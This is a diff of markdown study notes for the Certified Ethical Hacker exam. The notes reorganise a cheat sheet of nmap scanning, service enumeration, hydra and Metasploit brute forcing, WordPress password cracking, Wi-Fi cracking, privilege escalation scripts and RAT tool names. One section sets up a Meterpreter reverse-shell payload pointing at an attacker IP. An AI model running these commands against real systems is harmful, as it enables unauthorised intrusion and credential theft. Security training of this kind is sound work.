@@ -1,11 +1,11 @@
 # CEH MASTER NOTES  <summary> </summary>
-<details> </details>
-ALWAYS DO SUDO SU
 
-## 1. SCANNING 
+## ALWAYS DO SUDO SU
 <details>
-<summary>### NETWORKS</summary>
-
+<summary>1. SCANNING</summary>
+  <details>
+<details>
+<summary>NETWORKS</summary>
 **Own IP**
 ip a | ifconfig
 
@@ -39,14 +39,16 @@ nmap -sC -sV -p- -A -v -T4 <host>/CIDR
 
 **Host discovery**    
 netdiscover -i eth0 | netdiscover -r <host>/CIDR
-
-<summary>### WEB & SERVICES</summary>
-</details>
-
+  <details>
+  
 <details>
-<summary>## 2. SERVICE ENUMERATION</summary>
+<summary>WEB & SERVICES</summary>
 
-<summary### FTP PORT 21</summary>
+  <details>
+  
+## 2. SERVICE ENUMERATION
+
+### FTP PORT 21
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
 
 **Brute force FTP**                         
@@ -63,7 +65,7 @@ set pass_file /path/passwords.txt
 **Download file from FTP after login** 
 ls then get secret.txt
 
-<summary>### SSH PORT 22</summary>
+### SSH PORT 22
 https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/
 
 **Brute force username** 
@@ -73,7 +75,7 @@ msf> use scanner/ssh/ssh_enumusers |
 **Private key brute force**    
 msf> use scanner/ssh/ssh_identify_pubkeys |
 
-<summary>### TELNET PORT 23</summary>
+### TELNET PORT 23
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet | https://www.hackingarticles.in/penetration-testing-telnet-port-23/ | https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#telnet
 
 **Enumerate Telnet** 
@@ -81,7 +83,7 @@ nmap -n -sV -Pn --script "*telnet* and safe" -p 23 <host>
 **Brute force Telnet credentials** 
 hydra -l root -P passwords.txt [-t 32] <host> telnet 
 
-<summary>### SMTP PORT 25</summary>
+### SMTP PORT 25
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
 
 **Initiate a TCP connection to port 25**
@@ -94,7 +96,7 @@ dig +short mx google.com
 nmap -p25 --script smtp-commands <host>
 nmap -p25 --script smtp-open-relay <host> -v
 
-<summary>### DNS PORT 53</summary>
+### DNS PORT 53
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
 
 **Enumarate DNS**  
@@ -103,7 +105,7 @@ dnsrecon -w -d <host> |  dnsrecon -d <host> -z
 **Brute forcing**  
 nmap --script dns-brute <host>
 
-<summary>### NetBIOS PORT 137/138/139   </summary>
+### NetBIOS PORT 137/138/139   
 https://book.hacktricks.xyz/network-services-pentesting/137-138-139-pentesting-netbios
 
 **Enumerate NetBIOS** 
@@ -115,7 +117,7 @@ nbtstat -a <host> (-c list contents of Netbios name cache)
 **Enumerate Domain Users**	
 net use (Displays connection status, Shared folder/drive and Network Information) | net user | net user /domain | net user [username] | net user [username] /domain
 
-<summary>### SNMP PORT 161
+### SNMP PORT 161
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
 
 **Enumarate SNMP**     
@@ -134,7 +136,7 @@ show options
 set RHOST <host>
 exploit
 
-<summary>### SMB PORT 445</summary>
+### SMB PORT 445
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
 
 **Enumarate Network File Shares**      
@@ -169,7 +171,7 @@ smbclient //<host>/<share_name) -W <domain_name> -U <Username%password> |
 sudo mount -t cifs //<host>/<share_name> /<local path> -o username=<username>,password=<password>
 nmap -p 445 --script-enum-users --script-args smbusername=adminitrator, smbpassword=smbserver_771 <host> |
 
-<summary>### RDP PORT 3389</summary>
+### RDP PORT 3389
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp
 
 **Use metasploit to confirm the services running is RDP**
@@ -187,16 +189,14 @@ hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt rdp:
 **Use RDP tools to connect to machine**     
 xfreerdp /u:<username> /p:<password> /v:<host>:3389
 
-<summary>### HTTP/HTTPS PORT 80/443/8080/8081</summary>
+### HTTP/HTTPS PORT 80/443/8080/8081
 
-<summary>### Port Login</summary>
+### Port Login
 
 **FTP Login** 			| ftp <host>
 **SSH Logi**n			| ssh username@<host>
 **TELNET Login**		| telnet <host>
-</details>
 
-<details>
 ## 3. System Hacking
 
 **To create a Payload**
@@ -209,9 +209,7 @@ set payload windows/meterpreter/reverse_tcp
 set LHOST= attacker-IP  
 set LPORT= attacker-Port 
 run
-</details>
 
-<details>
 ## 4. SNIFFING
 
 ### Filtering packets 
@@ -231,9 +229,7 @@ select_packet > follow > TCP Stream
 | Finding Files | 3 |
 | Finding Comments | 4 |
 | Search Strings | 5 |
-</details>
 
-<details>
 ## 5. Steganography
 
 **SNOW** - for hiding and extracting hidden data from a text file
@@ -277,9 +273,7 @@ cc -o covert_tcp covert_tcp.c (On both client and server)
 
 **Receiver Machine**
 ./covert_tcp -source <ip address of sender> -source_port <sender destination port number> -server -file <file name>
-</details>
 
-<details>
 ## 6. Cryptography
 **Hash Identifier**
 https://www.onlinehashcrack.com/hash-identification.php
@@ -369,9 +363,7 @@ wpscan --url http://example.com/ceh --enumerate u
 Direct crack if we have user/password detail
 wpscan --url http://x.x.x.x/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
 wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt
-</details>
 
-<details>
 ## 7. Hacking WebServers & WebApps
 
 ### Nslookup
@@ -441,9 +433,7 @@ select * from login;
 select * from user;
 
 When you have username and Password for the database.
-</details>
-
-<details>
+  
 ## 8. Hacking Android
 
 ### ADB
@@ -528,9 +518,7 @@ http.request.method == POST   (for passwords) or click tools ---> credentials
 Also
 Find FQDN
 nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
-</details>
 
-<details>
 ## 9. Cracking Wi-Fi networks
 **Cracking Wifi Password**
 aircrack-ng [pcap file] (For cracking WEP network)
@@ -548,9 +536,7 @@ SQLMap - for finding SQL Injection Vulnerabilities
 Wpscan - scanning and finding issues in wordpress websites
 ADB - for connecting Android devices to PC and binary analysis
 Burpsuite - for analysing and manipulating the traffic
-</details>
 
-<details>
 ## 10. Privilege Escalation Basics
 ssh <user_name>@<IP> -p <port>
 
@@ -607,11 +593,9 @@ chmod +x linpeas.sh
 
 ./LinEnum.sh
 ./linepeas.sh
-</details>
 
-<details>
+
 ## 11. Malware Threats (RAT)
 5 RAT tools
 
 njRAT | MoSucker | ProRat | Theef | HTTP RAT
-</details>
